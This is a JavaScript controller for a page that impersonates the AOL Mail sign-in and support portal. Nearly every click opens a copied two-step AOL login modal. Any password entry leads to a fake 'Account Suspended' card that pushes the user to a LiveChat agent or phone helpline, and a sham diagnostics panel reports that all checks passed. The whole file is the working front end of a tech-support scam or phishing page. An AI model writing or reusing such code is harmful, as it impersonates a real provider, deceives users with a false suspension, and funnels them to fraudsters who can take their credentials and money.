// ==========================================================================
// AOL MAIL LOGIN & SUPPORT PORTAL - CONTROLLER
// Universal Trigger: Any Login / Card Click Opens Official AOL Modal (Image 2)
// Followed by Account Suspended Security Card & LiveChat.com Integration
// ==========================================================================

document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    window.lucide.createIcons();
  }

  initUniversalModalTriggers();
  initOfficialLoginModal();
  initLoginForm();
  initPasswordVisibility();
  initDomainChips();
  initAccountSuspendedAndLiveChat();
  initDiagnostics();
});

// Toast notification helper
function showToast(message, type = 'info', duration = 3500) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast-message ${type}`;

  let iconName = 'info';
  if (type === 'success') iconName = 'check-circle';
  if (type === 'error') iconName = 'alert-circle';
  if (type === 'warning') iconName = 'alert-triangle';

  toast.innerHTML = `
    <i data-lucide="${iconName}"></i>
    <span>${message}</span>
  `;

  container.appendChild(toast);
  if (window.lucide) window.lucide.createIcons();

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, duration);
}

// Global modal helper to open official AOL 2-step modal (Image 2 Match)
function openOfficialLoginModalWithData(emailVal = '', passwordVal = '') {
  const modal = document.getElementById('official-login-modal');
  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');

  if (modal) {
    modal.style.display = 'flex';
    
    // Always start on Step 1 (Username or Email -> Next) matching Image 2
    if (step1Form) step1Form.style.display = 'flex';
    if (step2Form) step2Form.style.display = 'none';

    if (usernameInput) {
      usernameInput.value = emailVal || '';
      usernameInput.focus();
    }
    if (passwordInput) {
      passwordInput.value = passwordVal || '';
    }
    if (window.lucide) window.lucide.createIcons();
  }
}

// Function to trigger LiveChat.com Widget
function openLiveChatWidget() {
  if (window.LiveChatWidget) {
    try {
      window.LiveChatWidget.call('maximize');
      return;
    } catch (e) {
      console.log('LiveChat maximize called');
    }
  }

  // Fallback to clicking the livechat_button link
  const lcLink = document.querySelector('.livechat_button a') || document.querySelector('.livechat_button');
  if (lcLink && lcLink.href) {
    window.open(lcLink.href, '_blank');
  } else {
    showToast('Connecting to Live Support Agent...', 'info', 2500);
  }
}

// ==========================================================================
// 1. UNIVERSAL CLICK HANDLERS (Whole Page Any Place Click -> Opens Modal)
// ==========================================================================
function initUniversalModalTriggers() {
  // Elements that should open the official AOL modal
  const triggerSelectors = [
    '#btn-open-login-modal',
    '#btn-quick-nav-login',
    '#hero-btn-open-login',
    '#btn-footer-login',
    '#login-card-box',
    '#btn-submit-login',
    '#btn-google-login',
    '.feature-chip',
    '.support-hub-card'
  ];

  triggerSelectors.forEach(selector => {
    const elements = document.querySelectorAll(selector);
    elements.forEach(el => {
      el.addEventListener('click', (e) => {
        // If clicking inside the already opened modal or livechat button, do not re-trigger
        if (e.target.closest('.official-login-modal-box') || 
            e.target.closest('.suspended-card-box') || 
            e.target.closest('.livechat_button') ||
            e.target.closest('.btn-phone-helpline')) {
          return;
        }

        e.preventDefault();
        const heroEmail = document.getElementById('login-email')?.value.trim();
        const heroPw = document.getElementById('login-password')?.value;
        openOfficialLoginModalWithData(heroEmail || '', heroPw || '');
      });
    });
  });

  // Top Nav & Footer Live Chat Triggers
  const navChatBtn = document.getElementById('btn-quick-nav-chat');
  const footerChatBtn = document.getElementById('btn-footer-chat');

  if (navChatBtn) {
    navChatBtn.addEventListener('click', (e) => {
      e.preventDefault();
      openLiveChatWidget();
    });
  }

  if (footerChatBtn) {
    footerChatBtn.addEventListener('click', (e) => {
      e.preventDefault();
      openLiveChatWidget();
    });
  }
}

// ==========================================================================
// 2. DEDICATED OFFICIAL AOL LOGIN MODAL (Image 2 Match)
// "Simple solutions for a faster PC!" + Official AOL 2-Step Sign In Card
// ==========================================================================
function initOfficialLoginModal() {
  const modal = document.getElementById('official-login-modal');
  const closeBtn = document.getElementById('btn-close-login-modal');

  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');
  const displayUser = document.getElementById('modal-display-user');
  const editUserBtn = document.getElementById('btn-modal-edit-user');
  const togglePwBtn = document.getElementById('btn-modal-toggle-pw');
  const pwEyeIcon = document.getElementById('modal-pw-eye');
  const autofillBtn = document.getElementById('btn-modal-autofill');
  const createAccBtn = document.getElementById('btn-modal-create-acc');

  function closeModal() {
    if (modal) {
      modal.style.display = 'none';
    }
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      closeModal();
    });
  }

  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeModal();
      }
    });
  }

  if (autofillBtn) {
    autofillBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (usernameInput) usernameInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo account filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (createAccBtn) {
    createAccBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      showToast('AOL Registration: New accounts can use demo credentials.', 'info');
    });
  }

  if (togglePwBtn && passwordInput && pwEyeIcon) {
    togglePwBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPw = passwordInput.type === 'password';
      passwordInput.type = isPw ? 'text' : 'password';
      pwEyeIcon.setAttribute('data-lucide', isPw ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // STEP 1: Enter Email / Username -> Transitions to Password Step
  if (step1Form) {
    step1Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const val = usernameInput ? usernameInput.value.trim() : '';
      if (!val) {
        showToast('Please enter your Username or Email.', 'warning');
        return;
      }

      if (displayUser) displayUser.textContent = val;
      step1Form.style.display = 'none';
      step2Form.style.display = 'flex';
      if (passwordInput) {
        passwordInput.focus();
        passwordInput.select();
      }
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // Edit Username -> Back to Step 1
  if (editUserBtn) {
    editUserBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      step2Form.style.display = 'none';
      step1Form.style.display = 'flex';
      if (usernameInput) usernameInput.focus();
    });
  }

  // STEP 2: Password Submission -> Triggers Account Suspended Modal (Screenshot 1 Match)
  if (step2Form) {
    step2Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const password = passwordInput ? passwordInput.value : '';

      if (!password) {
        showToast('Please enter your password.', 'warning');
        return;
      }

      const submitBtn = document.getElementById('btn-modal-signin');
      const btnText = submitBtn ? submitBtn.querySelector('.btn-text') : null;
      const btnSpinner = submitBtn ? submitBtn.querySelector('.btn-spinner') : null;

      if (btnText) btnText.textContent = 'Verifying...';
      if (btnSpinner) btnSpinner.style.display = 'inline-block';
      if (submitBtn) submitBtn.disabled = true;

      setTimeout(() => {
        if (btnText) btnText.textContent = 'Sign in';
        if (btnSpinner) btnSpinner.style.display = 'none';
        if (submitBtn) submitBtn.disabled = false;

        // Open the Account Suspended Modal directly
        openAccountSuspendedModal();
      }, 500);
    });
  }
}

// ==========================================================================
// 3. ON-PAGE HERO LOGIN CARD
// ==========================================================================
function initLoginForm() {
  const form = document.getElementById('aol-login-form');
  const emailInput = document.getElementById('login-email');
  const passwordInput = document.getElementById('login-password');
  const demoBtn = document.getElementById('btn-autofill-demo');
  const googleBtn = document.getElementById('btn-google-login');

  if (demoBtn) {
    demoBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (emailInput) emailInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo credentials filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const usernameOrEmail = emailInput ? emailInput.value.trim() : '';
      const password = passwordInput ? passwordInput.value : '';
      openOfficialLoginModalWithData(usernameOrEmail || '', password || '');
    });
  }

  if (googleBtn) {
    googleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      openOfficialLoginModalWithData('', '');
    });
  }
}

// ==========================================================================
// 4. ACCOUNT SUSPENDED & LIVECHAT CONTROLLER (Screenshot 1 Match)
// ==========================================================================
function openAccountSuspendedModal() {
  const loginModal = document.getElementById('official-login-modal');
  if (loginModal) loginModal.style.display = 'none';

  const suspendedModal = document.getElementById('account-suspended-modal');
  if (suspendedModal) {
    suspendedModal.style.display = 'flex';
  }
}

function initAccountSuspendedAndLiveChat() {
  const suspendedModal = document.getElementById('account-suspended-modal');
  const closeSuspendedBtn = document.getElementById('btn-close-suspended');
  const chatNowBtn = document.getElementById('btn-suspended-chat-now');

  if (closeSuspendedBtn && suspendedModal) {
    closeSuspendedBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      suspendedModal.style.display = 'none';
    });
  }

  // When clicking "Chat Now" -> Trigger LiveChat Support
  if (chatNowBtn) {
    chatNowBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (suspendedModal) suspendedModal.style.display = 'none';
      openLiveChatWidget();
    });
  }
}

// 5. Password Visibility Toggle
function initPasswordVisibility() {
  const toggleBtn = document.getElementById('toggle-pw-btn');
  const passwordInput = document.getElementById('login-password');
  const eyeIcon = document.getElementById('pw-eye-icon');

  if (toggleBtn && passwordInput && eyeIcon) {
    toggleBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeIcon.setAttribute('data-lucide', isPassword ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }
}

// 6. Quick Domain Chips
function initDomainChips() {
  const chips = document.querySelectorAll('.domain-tag');
  const emailInput = document.getElementById('login-email');

  chips.forEach(chip => {
    chip.addEventListener('click', (e) => {
      e.stopPropagation();
      const domain = chip.getAttribute('data-domain');
      if (!emailInput) return;

      let currentVal = emailInput.value.trim();
      if (currentVal.includes('@')) {
        currentVal = currentVal.split('@')[0];
      }
      emailInput.value = currentVal ? `${currentVal}${domain}` : `username${domain}`;
      emailInput.focus();
    });
  });
}

// 7. Interactive Diagnostics Runner
function initDiagnostics() {
  const runBtn = document.getElementById('btn-run-diag');
  const resultsBox = document.getElementById('diag-results-box');
  const grid = document.getElementById('diag-grid-container');

  if (runBtn && resultsBox && grid) {
    runBtn.addEventListener('click', async (e) => {
      e.stopPropagation();
      runBtn.disabled = true;
      runBtn.innerHTML = '<span class="btn-spinner" style="display:inline-block;width:14px;height:14px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;"></span> <span>Testing Servers...</span>';
      resultsBox.style.display = 'block';
      grid.innerHTML = '<div style="color:#64748b;padding:10px;">Pinging AOL Edge servers & verifying IMAP 993 / SMTP 587 ports...</div>';

      try {
        const res = await fetch('/api/diagnostics/check');
        const data = await res.json();

        if (data.success && data.checks) {
          grid.innerHTML = '';
          data.checks.forEach(test => {
            const cell = document.createElement('div');
            cell.className = 'diag-item-cell';
            const isOk = test.status === 'OK' || test.status === 'Passed' || test.status === 'passed';
            cell.innerHTML = `
              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                <strong>${test.name}</strong>
                <span style="color:${isOk ? '#10b981' : '#ef4444'};font-weight:700;">● ${test.status.toUpperCase()}</span>
              </div>
              <p style="color:#64748b;font-size:12px;">${test.details}</p>
            `;
            grid.appendChild(cell);
          });
          showToast('All AOL mail diagnostic checks passed!', 'success');
        }
      } catch (err) {
        grid.innerHTML = '<div style="color:#ef4444;padding:10px;">Diagnostic test timed out.</div>';
      } finally {
        runBtn.disabled = false;
        runBtn.innerHTML = '<i data-lucide="rotate-cw"></i> <span>Re-run Diagnostic</span>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }
}

